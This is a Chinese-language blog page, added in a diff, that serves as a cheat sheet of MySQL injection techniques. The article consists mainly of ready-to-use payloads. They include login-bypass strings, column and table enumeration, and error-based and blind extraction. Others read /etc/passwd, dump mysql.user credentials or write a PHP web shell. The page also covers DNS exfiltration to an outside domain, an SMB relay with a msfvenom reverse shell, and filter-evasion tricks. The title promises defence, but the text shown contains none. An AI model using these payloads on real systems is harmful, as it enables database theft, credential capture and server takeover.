@@ -1,0 +1,1320 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          MySQL注入攻击与防御 - Rootclay
+        
+    </title>
+
+    <link rel="canonical" href="http://rootclay.github.io/2017/04/21/MySQL注入攻击与防御/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('header.png')
+            /*post*/
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                            
+                              <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+                            
+                        </div>
+                        <h1>MySQL注入攻击与防御</h1>
+                        <h2 class="subheading">本文主要是做一个Mysql的注入总结，对于Mysql来说利用的方式太过于灵活，这里总结了一些主流的一些姿势，如果有好的姿势可以多加交流.</h2>
+                        <span class="meta">
+                            Posted by Rootclay on
+                            2017-04-21
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">ROOTCLAY</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="注入常用函数与字符">注入常用函数与字符</h1>
+<p>下面几点是注入中经常会用到的语句</p>
+<ul>
+<li>控制语句操作(select, case, if(), …)</li>
+<li>比较操作(=, like, mod(), …)</li>
+<li>字符串的猜解操作(mid(), left(), rpad(), …)</li>
+<li>字符串生成操作(0x61, hex(), conv()(使用conv([10-36],10,36)可以实现所有字符的表示))</li>
+</ul>
+<h1 id="测试注入">测试注入</h1>
+<p>可以用以下语句对一个可能的注入点进行测试</p>
+<table>
+<thead>
+<tr>
+<th>string</th>
+<th>numeric</th>
+<th>login</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>’</td>
+<td>AND 1</td>
+<td>’ OR '1</td>
+</tr>
+<tr>
+<td>’ ’</td>
+<td>AND 0</td>
+<td>’ OR 1 – -</td>
+</tr>
+<tr>
+<td>&quot;</td>
+<td>AND true</td>
+<td>&quot; OR “” = &quot;</td>
+</tr>
+<tr>
+<td>“”</td>
+<td>AND false</td>
+<td>&quot; OR 1 = 1 – -</td>
+</tr>
+<tr>
+<td>\</td>
+<td>1*2</td>
+<td>‘=’</td>
+</tr>
+<tr>
+<td>\</td>
+<td>1*2</td>
+<td>‘LIKE’</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>'=0–+</td>
+</tr>
+<tr>
+<td>SELECT * FROM Users WHERE id = ‘1’’’;<br>SELECT 1 FROM Users WHERE 1 = ‘1’’’’’’’’’’’’'UNION SELECT ‘2’;</td>
+<td>SELECT * FROM Users WHERE id = 3-2;</td>
+<td>SELECT * FROM Users WHERE username = ‘admin’ AND password = ‘’ OR ‘’ = ‘’;</td>
+</tr>
+</tbody>
+</table>
+<h1 id="注释符">注释符</h1>
+<p>以下是Mysql中可以用到的注释符：</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>#</td>
+<td>Hash注释</td>
+</tr>
+<tr>
+<td>/*</td>
+<td>C语言风格注释</td>
+</tr>
+<tr>
+<td>–</td>
+<td>SQL语句注释</td>
+</tr>
+<tr>
+<td>;%00</td>
+<td>空字节</td>
+</tr>
+<tr>
+<td>`</td>
+<td>反引号(只能在语句尾使用)</td>
+</tr>
+</tbody>
+</table>
+<p>Examples:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> username = <span class="string">''</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- -' AND password = '';</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">''</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span><span class="string">`';</span></div></pre></td></tr></table></figure>
+<h1 id="版本amp主机名amp用户amp库名">版本&amp;主机名&amp;用户&amp;库名</h1>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>主机名</th>
+<th>用户</th>
+<th>库名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>VERSION()</td>
+<td>@@HOSTNAME</td>
+<td>user()</td>
+<td>database()</td>
+</tr>
+<tr>
+<td>@@VERSION</td>
+<td></td>
+<td>current_user()</td>
+<td>SELECT schema_name FROM information_schema.schemata;</td>
+</tr>
+<tr>
+<td>@@GLOBAL.VERSION</td>
+<td></td>
+<td>system_user()</td>
+<td>SELECT DISTINCT(db) FROM mysql.db;–</td>
+</tr>
+<tr>
+<td>/<em>!mysql版本号</em>/（/<em>!50094eaea</em>/）当数字小于版本号时返回TRUE</td>
+<td></td>
+<td>session_user()</td>
+<td></td>
+</tr>
+<tr>
+<td>SELECT * FROM Users WHERE id = ‘1’ AND MID(VERSION(),1,1) = ‘5’;</td>
+<td></td>
+<td>SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = ‘root’–</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="表和字段">表和字段</h1>
+<h2 id="确定字段数">确定字段数</h2>
+<h3 id="order-by">ORDER BY</h3>
+<p>ORDER BY用于判断表中的字段个数</p>
+<table>
+<thead>
+<tr>
+<th>column</th>
+<th>column</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1’ ORDER BY 1–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1’ ORDER BY 2–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1’ ORDER BY 3–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1’ ORDER BY 4–+</td>
+<td>False - 字段有三个</td>
+</tr>
+<tr>
+<td>-1’ UNION SELECT 1,2,3–+</td>
+<td>True</td>
+</tr>
+</tbody>
+</table>
+<h3 id="select-into">SELECT … INTO</h3>
+<p>关于SELECT … INTO 的解释可以看这一篇文章<a href="http://www.w3school.com.cn/sql/sql_select_into.asp" target="_blank" rel="external">SELECT … INTO解释</a></p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>返回</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-1 UNION SELECT 1 INTO @,@,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>-1 UNION SELECT 1 INTO @,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>-1 UNION SELECT 1 INTO @</td>
+<td>没有报错就说明只有一列</td>
+</tr>
+</tbody>
+</table>
+<p>当出现LIMIT时可以用以下语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">1</span>,&#123;INJECTION POINT&#125;;</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 INTO @,@,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>1 INTO @,@</td>
+<td>没有报错就说明只有两列</td>
+</tr>
+</tbody>
+</table>
+<h3 id="判断已知表名的字段数">判断已知表名的字段数</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> SOME_EXISTING_TABLE) = <span class="number">1</span></div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> passwd <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = &#123;INJECTION POINT&#125;;</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 AND (SELECT * FROM Users) = 1</td>
+<td>Operand should contain 3 column(s)说明只有3列</td>
+</tr>
+</tbody>
+</table>
+<h2 id="查表名">查表名</h2>
+<p>以下提过几种方式对库中表进行查询</p>
+<table>
+<thead>
+<tr>
+<th>UNION查询</th>
+<th>BLIND盲注</th>
+<th>ERROR报错</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables</td>
+<td>AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; ‘A’</td>
+<td>1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="查列名">查列名</h2>
+<p>以下提过几种方式对表中列进行查询</p>
+<table>
+<thead>
+<tr>
+<th>UNION查询</th>
+<th>BLIND盲注</th>
+<th>ERROR报错</th>
+<th>PROCEDURE ANALYSE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = ‘tablename’ 可以不使用单引号，用16进制</td>
+<td>AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; ‘A’</td>
+<td>1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</td>
+<td>1 LIMIT 1,1 PROCEDURE ANALYSE()	获取到第二个字段名</td>
+</tr>
+</tbody>
+</table>
+<h1 id="字符串连接">字符串连接</h1>
+<p>下面的几条语句都可以用以连接字符</p>
+<table>
+<thead>
+<tr>
+<th>字符串连接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT ‘a’ ‘d’ ‘mi’ ‘n’;</td>
+</tr>
+<tr>
+<td>SELECT CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</td>
+</tr>
+<tr>
+<td>SELECT CONCAT_WS(’’, ‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</td>
+</tr>
+<tr>
+<td>SELECT GROUP_CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</td>
+</tr>
+</tbody>
+</table>
+<h1 id="条件语句amp时间函数">条件语句&amp;时间函数</h1>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CASE</td>
+<td>SLEEP()   mysql5以上才引入</td>
+</tr>
+<tr>
+<td>IF()</td>
+<td>BENCHMARK()  mysql4/5都有</td>
+</tr>
+<tr>
+<td>IFNULL()</td>
+<td>’ - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(‘true’)), false)) - ’</td>
+</tr>
+<tr>
+<td>NULLIF()</td>
+<td>SELECT IF(1=1, sleep(5), false);</td>
+</tr>
+<tr>
+<td>SELECT IF(1=1, true, false);</td>
+<td></td>
+</tr>
+<tr>
+<td>SELECT CASE WHEN 1=1 THEN true ELSE false END;</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>其中BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
+<h1 id="文件操作">文件操作</h1>
+<h2 id="文件操作权限">文件操作权限</h2>
+<p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE（）</p>
+<ol>
+<li>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+</ol>
+<p><img src="http://i1.piimg.com/4851/803a3db38c8007a3.png" alt="mysql——file"></p>
+<p>也可使用如下语句查询</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>是否需需要root</th>
+<th>版本支持</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT file_priv FROM mysql.user WHERE user = ‘username’;</td>
+<td>需要root</td>
+<td>mysql4/5</td>
+</tr>
+<tr>
+<td>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%username%’;</td>
+<td>不需要root</td>
+<td>mysql5</td>
+</tr>
+</tbody>
+</table>
+<h2 id="读文件">读文件</h2>
+<p>读文件函数<code>LOAD_FILE()</code></p>
+<p>Examples:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="string">'/etc/passwd'</span>);</div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="number">0x2F6574632F706173737764</span>);</div></pre></td></tr></table></figure>
+<p>注意点：</p>
+<ol>
+<li>LOAD_FILE的默认目录@@datadir</li>
+<li>文件必须是当前用户可读</li>
+<li>读文件最大的为1047552个byte, <code>@@max_allowed_packet</code>可以查看文件读取最大值</li>
+</ol>
+<h2 id="写文件">写文件</h2>
+<p><code>INTO OUTFILE/DUMPFILE</code></p>
+<p>经典写文件例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">To write a PHP shell:</div><div class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;? system($_GET[\'c\']); ?&gt;'</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/var/www/shell.php'</span>;</div></pre></td></tr></table></figure>
+<p>**<br>
+这两个函数都可以写文件，但是有很大的差别<br>
+INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符<br>
+INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择<br>
+当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的<br>
+**<br>
+网上有很多文章介绍，比如<a href="http://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="external">这篇</a></p>
+<p>注意点：</p>
+<ol>
+<li>INTO OUTFILE不会覆盖文件</li>
+<li>INTO OUTFILE必须是查询语句的最后一句</li>
+<li>路径名是不能编码的，必须使用单引号</li>
+</ol>
+<h1 id="带外通道">带外通道</h1>
+<p>关于带外通道的注入前段时间国外的大佬已经总结过了，我基本复现了一下，博客有<a href="http://www.rootclay.club/?p=213" target="_blank" rel="external">文章</a>，这里简单提一下</p>
+<h2 id="什么是带外通道注入">什么是带外通道注入？</h2>
+<p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</p>
+<h2 id="条件限制">条件限制</h2>
+<ul>
+<li>首先不用多说,这些函数是需要绝对路径的</li>
+<li>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+</ul>
+<h2 id="dns注入">DNS注入</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,<span class="keyword">version</span>(),<span class="string">'.rootclay.club\\clay.txt'</span>));</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="number">0x5c5c5c5c</span>,<span class="keyword">version</span>(),<span class="number">0x2e6861636b65722e736974655c5c612e747874</span>));</div></pre></td></tr></table></figure>
+<p>上面的语句执行的结果我们可以通过wireshark抓包看一下，过滤一下DNS协议即可清晰看到数据出去的样子，如下图<br>
+<img src="http://i1.piimg.com/4851/26fbe5de9ea3cfe8.png" alt=""></p>
+<p>进行DNS注入需要域名解析，自己有的话最好，但是没有的朋友也没事，这里推荐一个网站<a href="http://ceye.io/record/index" target="_blank" rel="external">CEYE</a>可以查看数据</p>
+<h2 id="smb-relay-注入攻击">SMB Relay 注入攻击</h2>
+<h3 id="what-is-smb-relay">What is SMB relay</h3>
+<p>这里简单的描述一下SMB relay这个过程</p>
+<p><strong>假设有主机B与A</strong><br>
+(1) A向B发起连接请求<br>
+(2) B向A发送挑战(一组随机数据，8字节)<br>
+(3) A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B<br>
+(4) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对前面发往A的挑战进<br>
+行标准DES加密<br>
+(5) 如果(4)中计算结果与A送过来的响应匹配，A被允许访问B<br>
+<strong>现在假设一个攻击者C卷入其中</strong><br>
+(1) C向B发起连接请求<br>
+(2) B向C发送挑战D(一组随机数据)<br>
+(3) C等待A向B发起连接请求<br>
+(4) 当A向B发起连接请求时，C伪造成B向A发送挑战D<br>
+(5) A用源自明文口令的DESKEY对挑战D进行标准DES加密得到响应E，并发往B<br>
+(6) C截获到响应E，将它做为针对(2)中挑战D的响应发往B，并声称自己是A<br>
+(7) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对挑战D进行标准DES<br>
+加密<br>
+(8) 如果(7)中计算结果与C送过来的响应匹配，C被允许以A的身份访问B。</p>
+<h3 id="攻击流程">攻击流程</h3>
+<p><img src="http://i1.piimg.com/4851/373a817ae5fc4ea4.png" alt=""></p>
+<p>关于SMB relay攻击窃取NTML与shell请看这篇文章<a href="http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python" target="_blank" rel="external">SMB Relay Demystified and NTLMv2 Pwnage with Python</a></p>
+<p>整理了一下实际操作的步骤如下:</p>
+<ol>
+<li>首先生成一个反向shell:<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=攻击机监听端口  -f exe &gt; reverse_shell.exe</li>
+<li>运行<a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="external">smbrelayx</a>，指定被攻击者和生成的反向shell，等待连接。<br>
+<a href="http://smbrelayx.py" target="_blank" rel="external">smbrelayx.py</a> -h 被攻击者ip -e 反向shell文件位置</li>
+<li>使用模块multi/handler。侦听攻击机ip,攻击机监听端口</li>
+<li>在MySQL Server上运行如下的代码，则会产生shell。相当于访问攻击机的smb服务,但实际上是窃取了mysql_server的身份<br>
+select load_file(’\\攻击机ip\aa’);</li>
+</ol>
+<h1 id="绕过技巧">绕过技巧</h1>
+<h2 id="绕过单引号">绕过单引号</h2>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT * FROM Users WHERE username = 0x61646D696E</td>
+<td>HEX编码</td>
+</tr>
+<tr>
+<td>SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</td>
+<td>CHAR()函数</td>
+</tr>
+</tbody>
+</table>
+<h2 id="大小写绕过">大小写绕过</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+UnIoN+<span class="keyword">SeLecT</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></div></pre></td></tr></table></figure>
+<h2 id="替换绕过">替换绕过</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+UNunionION+SEselectLECT+1,2,3<span class="comment">--</span></div></pre></td></tr></table></figure>
+<h2 id="注释绕过">注释绕过</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1+un<span class="comment">/**/</span>ion+se<span class="comment">/**/</span>lect+1,2,3<span class="comment">--</span></div></pre></td></tr></table></figure>
+<h2 id="特殊嵌入绕过">特殊嵌入绕过</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1<span class="comment">/*!UnIoN*/</span><span class="keyword">SeLecT</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></div></pre></td></tr></table></figure>
+<h2 id="宽字节注入">宽字节注入</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</div></pre></td></tr></table></figure>
+<h2 id="mysql版本号字符">MySQL版本号字符</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Examples:</div><div class="line">UNION <span class="keyword">SELECT</span> <span class="comment">/*!50000 5,null;%00*/</span><span class="comment">/*!40000 4,null-- ,*/</span><span class="comment">/*!30000 3,null-- x*/</span><span class="number">0</span>,<span class="literal">null</span><span class="comment">--+</span></div><div class="line"><span class="keyword">SELECT</span> <span class="number">1</span><span class="comment">/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/</span>);</div></pre></td></tr></table></figure>
+<ul>
+<li>这样的查询语句是可以执行的，我理解为类似Python中第一行注释指定解析器一样<code>#!/bin/sh</code></li>
+<li>对于小于或等于版本号的语句就会执行</li>
+<li>例如目前的Mysql版本为5.7.17那么/<em>!50717</em>/及其以下的语句即可执行</li>
+</ul>
+<h2 id="字符编码绕过">字符编码绕过</h2>
+<p>前端时间看到ph师傅的博客是讨论mysql字符编码的文章，大概意思如下，原文在<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">这里</a><br>
+当出现有以下代码时，指设置了字符编码为utf-8，但并不是全部为utf-8，而在具体的转换过程中会出现意外的情况，具体可以看ph师傅的文章</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$mysqli-&gt;query(<span class="string">"set names utf8"</span>);</div></pre></td></tr></table></figure>
+<p>在sql查询中</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?username=admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等</div></pre></td></tr></table></figure>
+<h2 id="绕空格">绕空格</h2>
+<h3 id="特殊字符绕过空格">特殊字符绕过空格</h3>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>09</td>
+<td>Horizontal Tab</td>
+</tr>
+<tr>
+<td>0A</td>
+<td>New Line</td>
+</tr>
+<tr>
+<td>0B</td>
+<td>Vertical Tab</td>
+</tr>
+<tr>
+<td>0C</td>
+<td>New Page</td>
+</tr>
+<tr>
+<td>0D</td>
+<td>Carriage Return</td>
+</tr>
+<tr>
+<td>A0</td>
+<td>Non-breaking Space</td>
+</tr>
+<tr>
+<td>20</td>
+<td>Space</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Example:</div><div class="line"></div><div class="line">'%0AUNION%0CSELECT%A0NULL%20%23</div></pre></td></tr></table></figure>
+<h3 id="括号绕过空格">括号绕过空格</h3>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>28</td>
+<td>(</td>
+</tr>
+<tr>
+<td>29</td>
+<td>)</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Example:</div><div class="line"></div><div class="line">UNION(<span class="keyword">SELECT</span>(<span class="keyword">column</span>)<span class="keyword">FROM</span>(<span class="keyword">table</span>))</div></pre></td></tr></table></figure>
+<h3 id="andor后插入字符绕过空格">and/or后插入字符绕过空格</h3>
+<p>任意混合<code>+ - ~ !</code>可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）</p>
